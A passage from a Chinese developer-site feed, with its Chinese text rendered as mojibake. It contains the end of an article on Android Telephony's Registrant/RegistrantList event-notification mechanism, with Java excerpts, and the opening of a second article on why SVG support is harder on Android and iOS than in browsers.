        mNetworkDetachedRegistrants.remove(h);
    }
</code></pre>
<p><strong>ç‰¹ç‚¹</strong>: æ³¨å†Œæ—¶ç«‹å³æ£€æŸ¥å½“å‰çŠ¶æ€,å¦‚æœå·²æ»¡è¶³æ¡ä»¶åˆ™ç«‹å³é€šçŸ¥</p>
<h4 data-id="heading-11"><strong>3. ç›‘å¬è€…æ³¨å†Œ (ç¤ºä¾‹:DisplayInfoController)</strong></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// DisplayInfoController.java</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">EVENT_SERVICE_STATE_CHANGED</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;

<span class="hljs-keyword">public</span> <span class="hljs-title function_">DisplayInfoController</span><span class="hljs-params">(Phone phone)</span> {
    mPhone = phone;
    <span class="hljs-comment">// æ³¨å†ŒæœåŠ¡çŠ¶æ€å˜åŒ–ç›‘å¬</span>
    mPhone.getServiceStateTracker()
        .registerForServiceStateChanged(<span class="hljs-built_in">this</span>, EVENT_SERVICE_STATE_CHANGED, <span class="hljs-literal">null</span>);
}

<span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleMessage</span><span class="hljs-params">(Message msg)</span> {
    <span class="hljs-keyword">switch</span> (msg.what) {
        <span class="hljs-keyword">case</span> EVENT_SERVICE_STATE_CHANGED:
            <span class="hljs-type">AsyncResult</span> <span class="hljs-variable">ar</span> <span class="hljs-operator">=</span> (AsyncResult) msg.obj;
            <span class="hljs-type">ServiceState</span> <span class="hljs-variable">ss</span> <span class="hljs-operator">=</span> (ServiceState) ar.result;
            <span class="hljs-comment">// å¤„ç†æœåŠ¡çŠ¶æ€å˜åŒ–</span>
            updateDisplayInfo(ss);
            <span class="hljs-keyword">break</span>;
    }
}
</code></pre>
<h4 data-id="heading-12"><strong>4. è§¦å‘é€šçŸ¥</strong></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ServiceStateTracker.java</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">pollStateDone</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// ... çŠ¶æ€æ£€æŸ¥</span>
    
    <span class="hljs-keyword">if</span> (hasNetworkAttached) {
        mNetworkAttachedRegistrants.notifyRegistrants();
    }
    
    <span class="hljs-keyword">if</span> (hasNetworkDetached) {
        mNetworkDetachedRegistrants.notifyRegistrants();
    }
}
</code></pre>
<hr/>
<h3 data-id="heading-13"><strong>å››ã€é«˜çº§ç‰¹æ€§</strong></h3>
<h4 data-id="heading-14"><strong>1. Phone åˆ‡æ¢æ—¶çš„è¿ç§» (migrateFrom)</strong></h4>
<pre><code class="hljs language-1170:1190:frameworks_opt_telephony/src/java/com/android/internal/telephony/Phone.java" lang="1170:1190:frameworks_opt_telephony/src/java/com/android/internal/telephony/Phone.java">    protected void migrate(RegistrantList to, RegistrantList from) {
        if (from == null) {
            // May be null in some cases, such as testing.
            return;
        }
        from.removeCleared();
        for (int i = 0, n = from.size(); i &lt; n; i++) {
            Registrant r = (Registrant) from.get(i);
            Message msg = r.messageForRegistrant();
            // Since CallManager has already registered with both CS and IMS phones,
            // the migrate should happen only for those registrants which are not
            // registered with CallManager.Hence the below check is needed to add
            // only those registrants to the registrant list which are not
            // coming from the CallManager.
            if (msg != null) {
                if (msg.obj == CallManager.getInstance().getRegistrantIdentifier()) {
                    continue;
                } else {
                    to.add((Registrant) from.get(i));
                }
            } else {
</code></pre>
<p><strong>åº”ç”¨åœºæ™¯</strong>:</p>
<ul>
<li>GSM â†” CDMA åˆ‡æ¢</li>
<li>SRVCC (CS åŸŸåˆ‡æ¢)</li>
<li>Phone å¯¹è±¡æ›¿æ¢</li>
</ul>
<p><strong>è¿‡ç¨‹</strong>:</p>
<ol>
<li>æ¸…ç†å·²å¤±æ•ˆçš„ Registrant</li>
<li>éå†æºåˆ—è¡¨</li>
<li>æ’é™¤ç‰¹å®šæ³¨å†Œè€…(å¦‚ CallManager)</li>
<li>è¿ç§»åˆ°æ–°åˆ—è¡¨</li>
</ol>
<h4 data-id="heading-15"><strong>2. æ¡ä»¶é€šçŸ¥ (notifyNow)</strong></h4>
<pre><code class="hljs language-272:283:frameworks_opt_telephony/src/java/com/android/internal/telephony/CarrierActionAgent.java" lang="272:283:frameworks_opt_telephony/src/java/com/android/internal/telephony/CarrierActionAgent.java">    public void registerForCarrierAction(int action, Handler h, int what, Object obj,
                                         boolean notifyNow) {
        Boolean carrierAction = getCarrierActionEnabled(action);
        if (carrierAction == null) {
            throw new IllegalArgumentException("invalid carrier action: " + action);
        }
        RegistrantList list = getRegistrantsFromAction(action);
        Registrant r = new Registrant(h, what, obj);
        list.add(r);
        if (notifyNow) {
            r.notifyRegistrant(new AsyncResult(null, carrierAction, null));
        }
    }
</code></pre>
<p><strong>ç‰¹ç‚¹</strong>:</p>
<ul>
<li><code>notifyNow=true</code>: æ³¨å†Œåç«‹å³é€šçŸ¥å½“å‰çŠ¶æ€</li>
<li>é¿å…é”™è¿‡çŠ¶æ€</li>
</ul>
<h4 data-id="heading-16"><strong>3. å¤šä¼ è¾“ç±»å‹æ”¯æŒ</strong></h4>
<pre><code class="hljs language-4718:4733:frameworks_opt_telephony/src/java/com/android/internal/telephony/ServiceStateTracker.java" lang="4718:4733:frameworks_opt_telephony/src/java/com/android/internal/telephony/ServiceStateTracker.java">    public void registerForDataConnectionAttached(@TransportType int transport, Handler h, int what,
                                                  Object obj) {
        Registrant r = new Registrant(h, what, obj);
        if (mAttachedRegistrants.get(transport) == null) {
            mAttachedRegistrants.put(transport, new RegistrantList());
        }
        mAttachedRegistrants.get(transport).add(r);

        if (mSS != null) {
            NetworkRegistrationInfo netRegState = mSS.getNetworkRegistrationInfo(
                    NetworkRegistrationInfo.DOMAIN_PS, transport);
            if (netRegState == null || netRegState.isInService()) {
                r.notifyRegistrant();
            }
        }
    }
</code></pre>
<p><strong>è®¾è®¡</strong>:</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> SparseArray&lt;RegistrantList&gt; mAttachedRegistrants = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SparseArray</span>&lt;&gt;();
</code></pre>
<ul>
<li>ä½¿ç”¨ <code>SparseArray&lt;RegistrantList&gt;</code> ç®¡ç†å¤šç§ä¼ è¾“ç±»å‹</li>
<li>WWAN (èœ‚çªç½‘ç»œ)</li>
<li>WLAN (Wi-Fi)</li>
</ul>
<hr/>
<h3 data-id="heading-17"><strong>äº”ã€è®¾è®¡ä¼˜åŠ¿</strong></h3>
<h4 data-id="heading-18"><strong>1. å†…å­˜å®‰å…¨</strong></h4>
<ul>
<li><strong>å¼±å¼•ç”¨</strong>: è‡ªåŠ¨é¿å…å†…å­˜æ³„æ¼</li>
<li><strong>removeCleared()</strong>: è‡ªåŠ¨æ¸…ç†å¤±æ•ˆæ³¨å†Œè€…</li>
</ul>
<h4 data-id="heading-19"><strong>2. çº¿ç¨‹å®‰å…¨</strong></h4>
<ul>
<li><strong>Handler æœºåˆ¶</strong>: é€šè¿‡ Message åœ¨ç›®æ ‡çº¿ç¨‹æ‰§è¡Œ</li>
<li><strong>synchronized</strong>: RegistrantList çš„å…³é”®æ–¹æ³•åŒæ­¥</li>
</ul>
<h4 data-id="heading-20"><strong>3. è§£è€¦è®¾è®¡</strong></h4>
<ul>
<li>äº‹ä»¶å‘å¸ƒè€…æ— éœ€çŸ¥é“ç›‘å¬è€…ç»†èŠ‚</li>
<li>ç›‘å¬è€…å¯åŠ¨æ€æ·»åŠ /ç§»é™¤</li>
<li>æ”¯æŒå¤šå¯¹å¤šå…³ç³»</li>
</ul>
<h4 data-id="heading-21"><strong>4. çµæ´»æ€§</strong></h4>
<ul>
<li>æ”¯æŒæºå¸¦è‡ªå®šä¹‰æ•°æ® (<code>userObj</code>)</li>
<li>æ”¯æŒæºå¸¦ç»“æœå’Œå¼‚å¸¸ (<code>AsyncResult</code>)</li>
<li>æ”¯æŒç«‹å³é€šçŸ¥å½“å‰çŠ¶æ€</li>
</ul>
<h4 data-id="heading-22"><strong>5. é«˜æ•ˆ</strong></h4>
<ul>
<li>ArrayList éå†æ€§èƒ½é«˜</li>
<li>å¼±å¼•ç”¨è‡ªåŠ¨æ¸…ç†,æ— éœ€æ‰‹åŠ¨ç®¡ç†</li>
<li>æ‰¹é‡é€šçŸ¥é«˜æ•ˆ</li>
</ul>
<hr/>
<h3 data-id="heading-23"><strong>å…­ã€ä¸æ ‡å‡†è§‚å¯Ÿè€…æ¨¡å¼å¯¹æ¯”</strong></h3>








































<table><thead><tr><th>ç‰¹æ€§</th><th>Registrant æœºåˆ¶</th><th>æ ‡å‡† Observer æ¨¡å¼</th></tr></thead><tbody><tr><td><strong>Handler é›†æˆ</strong></td><td>âœ“ å†…ç½® Handler æ”¯æŒ</td><td>âœ— éœ€è‡ªè¡Œå®ç°</td></tr><tr><td><strong>çº¿ç¨‹å®‰å…¨</strong></td><td>âœ“ Message æœºåˆ¶è·¨çº¿ç¨‹</td><td>âœ— éœ€é¢å¤–å¤„ç†</td></tr><tr><td><strong>å†…å­˜ç®¡ç†</strong></td><td>âœ“ WeakReference è‡ªåŠ¨</td><td>âœ— éœ€æ‰‹åŠ¨æ¸…ç†</td></tr><tr><td><strong>å¼‚å¸¸ä¼ é€’</strong></td><td>âœ“ AsyncResult å°è£…</td><td>âœ— é€šå¸¸ä¸æ”¯æŒ</td></tr><tr><td><strong>ç«‹å³é€šçŸ¥</strong></td><td>âœ“ æ³¨å†Œæ—¶å¯é€‰é€šçŸ¥</td><td>âœ— é€šå¸¸ä¸æ”¯æŒ</td></tr><tr><td><strong>æ•°æ®æºå¸¦</strong></td><td>âœ“ userObj + result</td><td>âœ“ é€šå¸¸æ”¯æŒ</td></tr></tbody></table>
<hr/>
<h3 data-id="heading-24"><strong>ä¸ƒã€å®æˆ˜:è‡ªå®šä¹‰äº‹ä»¶ç›‘å¬</strong></h3>
<p>å‡è®¾è¦ä¸º <code>DataConnection</code> æ·»åŠ çŠ¶æ€ç›‘å¬:</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 1. å£°æ˜ RegistrantList</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">RegistrantList</span> <span class="hljs-variable">mDataStateChangedRegistrants</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RegistrantList</span>();

<span class="hljs-comment">// 2. æä¾›æ³¨å†Œæ¥å£</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">registerForDataStateChanged</span><span class="hljs-params">(Handler h, <span class="hljs-type">int</span> what, Object obj)</span> {
    <span class="hljs-type">Registrant</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Registrant</span>(h, what, obj);
    mDataStateChangedRegistrants.add(r);
    
    <span class="hljs-comment">// ç«‹å³é€šçŸ¥å½“å‰çŠ¶æ€</span>
    r.notifyResult(getCurrentState());
}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">unregisterForDataStateChanged</span><span class="hljs-params">(Handler h)</span> {
    mDataStateChangedRegistrants.remove(h);
}

<span class="hljs-comment">// 3. çŠ¶æ€å˜åŒ–æ—¶é€šçŸ¥</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">notifyDataStateChanged</span><span class="hljs-params">(<span class="hljs-type">int</span> newState)</span> {
    mDataStateChangedRegistrants.notifyResult(newState);
}

<span class="hljs-comment">// 4. ç›‘å¬è€…ä½¿ç”¨</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">MyController</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Handler</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">EVENT_DATA_STATE_CHANGED</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(DataConnection dc)</span> {
        dc.registerForDataStateChanged(<span class="hljs-built_in">this</span>, EVENT_DATA_STATE_CHANGED, <span class="hljs-literal">null</span>);
    }
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleMessage</span><span class="hljs-params">(Message msg)</span> {
        <span class="hljs-keyword">if</span> (msg.what == EVENT_DATA_STATE_CHANGED) {
            <span class="hljs-type">AsyncResult</span> <span class="hljs-variable">ar</span> <span class="hljs-operator">=</span> (AsyncResult) msg.obj;
            <span class="hljs-type">int</span> <span class="hljs-variable">state</span> <span class="hljs-operator">=</span> (Integer) ar.result;
            <span class="hljs-comment">// å¤„ç†çŠ¶æ€å˜åŒ–</span>
        }
    }
}
</code></pre>
<hr/>
<h3 data-id="heading-25"><strong>å…«ã€æ€»ç»“</strong></h3>
<p>Android Telephony çš„ç›‘å¬æ³¨å†Œæœºåˆ¶æ˜¯ä¸€ä¸ª<strong>ç²¾å¿ƒè®¾è®¡çš„äº‹ä»¶åˆ†å‘ç³»ç»Ÿ</strong>:</p>
<ol>
<li>
<p><strong>æ ¸å¿ƒç»„ä»¶</strong>:</p>
<ul>
<li><code>Registrant</code>: å•ä¸ªç›‘å¬è€…å°è£…</li>
<li><code>RegistrantList</code>: ç›‘å¬è€…åˆ—è¡¨ç®¡ç†</li>
<li><code>AsyncResult</code>: ç»Ÿä¸€ç»“æœå°è£…</li>
</ul>
</li>
<li>
<p><strong>å…³é”®ç‰¹æ€§</strong>:</p>
<ul>
<li>å¼±å¼•ç”¨è‡ªåŠ¨å†…å­˜ç®¡ç†</li>
<li>Handler æœºåˆ¶ä¿è¯çº¿ç¨‹å®‰å…¨</li>
<li>æ”¯æŒç«‹å³é€šçŸ¥å½“å‰çŠ¶æ€</li>
<li>æ”¯æŒå¼‚å¸¸å’Œç»“æœä¼ é€’</li>
</ul>
</li>
<li>
<p><strong>å¹¿æ³›åº”ç”¨</strong>:</p>
<ul>
<li>Phone çŠ¶æ€ç›‘å¬</li>
<li>ServiceState å˜åŒ–</li>
<li>æ•°æ®è¿æ¥çŠ¶æ€</li>
<li>SIM å¡äº‹ä»¶</li>
<li>ä¿¡å·å¼ºåº¦</li>
<li>...</li>
</ul>
</li>
</ol>
<p>è¿™å¥—æœºåˆ¶æ˜¯æ•´ä¸ª Android Telephony æ¡†æ¶çš„<strong>ç¥ç»ç³»ç»Ÿ</strong>,è¿æ¥äº†ä»åº•å±‚ RIL åˆ°ä¸Šå±‚ Framework çš„æ‰€æœ‰ç»„ä»¶!</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä¸ºä½• SVG åœ¨ Web ç®€å•ï¼Œåœ¨ç§»åŠ¨ç«¯å´å¾ˆéš¾ï¼Ÿ]]></title>    <link>https://juejin.cn/post/7602474148095049780</link>    <guid>https://juejin.cn/post/7602474148095049780</guid>    <pubDate>2026-02-04T01:45:14.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602474148095049780" data-draft-id="7602472997921423360" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä¸ºä½• SVG åœ¨ Web ç®€å•ï¼Œåœ¨ç§»åŠ¨ç«¯å´å¾ˆéš¾ï¼Ÿ"/> <meta itemprop="keywords" content="Android,iOS,å®¢æˆ·ç«¯"/> <meta itemprop="datePublished" content="2026-02-04T01:45:14.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Gemini001"/> <meta itemprop="url" content="https://juejin.cn/user/2333635831676704"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä¸ºä½• SVG åœ¨ Web ç®€å•ï¼Œåœ¨ç§»åŠ¨ç«¯å´å¾ˆéš¾ï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2333635831676704/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Gemini001
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-04T01:45:14.000Z" title="Wed Feb 04 2026 01:45:14 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ä¸ºä»€ä¹ˆå‰ç«¯åŠ è½½ SVG è½»è€Œæ˜“ä¸¾ï¼Œç§»åŠ¨ç«¯ï¼ˆAndroid/iOSï¼‰å´å›°éš¾é‡é‡ï¼Ÿ</h2>
<p>åœ¨è·¨å¹³å°å¼€å‘çš„è®¨è®ºä¸­ï¼Œè¿™æ˜¯ä¸€ä¸ªéå¸¸ç»å…¸çš„é—®é¢˜ã€‚è®¸å¤šä» Web è½¬å‘ç§»åŠ¨ç«¯ï¼ˆAndroid/iOSï¼‰å¼€å‘çš„å·¥ç¨‹å¸ˆéƒ½ä¼šæ„Ÿåˆ°å›°æƒ‘ï¼šä¸ºä»€ä¹ˆåœ¨æµè§ˆå™¨é‡Œå†™ä¸€ä¸ªÂ <code>&lt;img src="icon.svg"&gt;</code>å°±èƒ½å®Œç¾æ˜¾ç¤ºï¼Œè€Œåˆ°äº† App é‡Œå´éœ€è¦å„ç§è½¬æ¢ã€æŠ¥é”™é¢‘å‡ºï¼Œç”šè‡³æ ¹æœ¬ä¸æ”¯æŒï¼Ÿ</p>
<p>ç®€å•æ¥è¯´ï¼š<strong>Web æµè§ˆå™¨æ˜¯ SVG çš„â€œåŸç”Ÿçˆ¶æ¯â€ï¼Œè€Œ Android å’Œ iOS åªæ˜¯ SVG çš„â€œè¿œæˆ¿äº²æˆšâ€</strong> ã€‚</p>
<p>è¿™å¹¶ä¸æ˜¯ç§»åŠ¨ç«¯å®Œå…¨æ— æ³•åŠ è½½ SVGï¼Œè€Œæ˜¯äºŒè€…æ”¯æŒçš„æ–¹å¼ã€ç¨‹åº¦å’Œåº•å±‚é€»è¾‘å®Œå…¨ä¸åŒã€‚åœ¨æ·±å…¥å‰–æä¹‹å‰ï¼Œæˆ‘ä»¬é¦–å…ˆéœ€è¦ææ¸…æ¥šï¼š<strong>SVG åˆ°åº•æ˜¯ä»€ä¹ˆï¼Ÿ</strong></p>
<h3 data-id="heading-1">0. SVG åˆ°åº•æ˜¯ä»€ä¹ˆï¼Ÿâ€”â€” ä»æ¦‚å¿µåˆ°æœ¬è´¨</h3>
<p>è¦ç†è§£è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬é¦–å…ˆè¦æ˜ç™½ SVG çš„æœ¬è´¨ã€‚</p>
<ul>
<li>
<p><strong>å®šä¹‰</strong>ï¼š<strong>SVG (Scalable Vector Graphics)</strong> ï¼Œå³å¯ç¼©æ”¾çŸ¢é‡å›¾å½¢ï¼Œæ˜¯ä¸€ç§åŸºäºÂ <strong>XML</strong>ï¼ˆå¯æ‰©å±•æ ‡è®°è¯­è¨€ï¼‰æ¥æè¿°äºŒç»´å›¾å½¢çš„Â <strong>W3C æ ‡å‡†</strong>ã€‚</p>
</li>
<li>
<p><strong>æ ¸å¿ƒæ€æƒ³ï¼šç”¨ä»£ç ç”»å›¾</strong></p>
<p>ä½ å¯ä»¥æŠŠ SVG æ–‡ä»¶æƒ³è±¡æˆä¸€ä¸ª<strong>ç”¨æ–‡æœ¬ç¼–å†™çš„ç»˜å›¾è„šæœ¬</strong>ã€‚å®ƒä¸æ˜¯åƒ PNG/JPG é‚£æ ·çš„åƒç´ é›†åˆï¼ˆä½å›¾ï¼‰ï¼Œè€Œæ˜¯åƒä¸€ä»½ç²¾ç¡®çš„æ–½å·¥å›¾çº¸ï¼Œå‘Šè¯‰æ¸²æŸ“å¼•æ“ï¼šâ€œåœ¨è¿™é‡Œç”»ä¸€ä¸ªåŠå¾„ä¸º50çš„åœ†â€ã€â€œä»è¿™é‡Œåˆ°é‚£é‡Œç”»ä¸€æ¡çº¢è‰²çš„è´å¡å°”æ›²çº¿â€ã€â€œç»™è¿™ä¸ªåŒºåŸŸå¡«å……ä¸€ä¸ªä»è“åˆ°ç™½çš„çº¿æ€§æ¸å˜â€ã€‚</p>
</li>
<li>
<p><strong>ä¸ç”Ÿä¿±æ¥çš„ä¼˜åŠ¿ï¼šæ— æŸç¼©æ”¾</strong></p>
<p>å› ä¸ºå®ƒæ˜¯é€šè¿‡æ•°å­¦å…¬å¼ï¼ˆç‚¹ã€çº¿ã€è·¯å¾„ã€å½¢çŠ¶ï¼‰æ¥å®šä¹‰å›¾å½¢ï¼Œæ‰€ä»¥åœ¨ä»»ä½•åˆ†è¾¨ç‡ä¸‹æ”¾å¤§æˆ–ç¼©å°ï¼Œéƒ½ä¸ä¼šå‡ºç°åƒç´ åŒ–çš„é”¯é½¿ï¼Œæ°¸è¿œä¿æŒæ¸…æ™°é”åˆ©ã€‚è¿™æ­£æ˜¯å®ƒåœ¨é«˜åˆ†è¾¨ç‡å±å¹•ï¼ˆRetina, 4Kï¼‰ä¸Šå¤‡å—é’ççš„åŸå› ã€‚</p>
</li>
<li>
<p><strong>ä¸ä»…æ˜¯é™æ€å›¾</strong></p>
<p>SVG çš„å¼ºå¤§ä¹‹å¤„åœ¨äºå…¶ä¸°å¯Œçš„ç‰¹æ€§é›†ï¼Œå®ƒè¿œä¸æ­¢æ˜¯ä¸€å¼ â€œå›¾â€ï¼š</p>
<ul>
<li><strong>æ ·å¼å¯æ§</strong>ï¼šå¯ä»¥é€šè¿‡ CSS åƒæ§åˆ¶ç½‘é¡µå…ƒç´ ä¸€æ ·æ”¹å˜å…¶é¢œè‰²ã€æè¾¹ã€é€æ˜åº¦ã€‚</li>
<li><strong>åŠ¨æ€äº¤äº’</strong>ï¼šå¯ä»¥åµŒå…¥ JavaScriptï¼Œå“åº”ç”¨æˆ·çš„ç‚¹å‡»ã€æ‚¬åœç­‰äº‹ä»¶ã€‚</li>
<li><strong>åŠ¨ç”»æ”¯æŒ</strong>ï¼šæ”¯æŒ SMIL åŠ¨ç”»æˆ–é€šè¿‡ CSS/JS åˆ›å»ºå¤æ‚åŠ¨ç”»ã€‚</li>
<li><strong>å¤æ‚æ•ˆæœ</strong>ï¼šæ”¯æŒé«˜æ–¯æ¨¡ç³Šã€é˜´å½±ã€å„ç§æ¸å˜ç­‰æ»¤é•œæ•ˆæœã€‚</li>
</ul>
</li>
</ul>
<p>ç†è§£äº† SVG çš„è¿™äº›ç‰¹è´¨ï¼Œæˆ‘ä»¬å°±èƒ½æ›´å¥½åœ°ç†è§£ä¸ºä»€ä¹ˆå®ƒåœ¨ Web ä¸–ç•Œå¦‚é±¼å¾—æ°´ï¼Œå´åœ¨ç§»åŠ¨ç«¯ä¸–ç•Œé‡Œæ­¥å±¥è¹’è·šã€‚</p>
<hr/>
<p>æ¥ä¸‹æ¥ï¼Œè®©æˆ‘ä»¬çœ‹çœ‹ Web å’Œç§»åŠ¨ç«¯åœ¨å¤„ç† SVG æ—¶çš„æ ¹æœ¬å·®å¼‚ã€‚</p>
<h3 data-id="heading-2">1. åŸºå› ä¸åŒï¼šDOM æ¸²æŸ“ vs å›¾å½¢å¼•æ“æ¸²æŸ“</h3>
<h4 data-id="heading-3">Web å‰ç«¯ (æµè§ˆå™¨)</h4>
<ul>
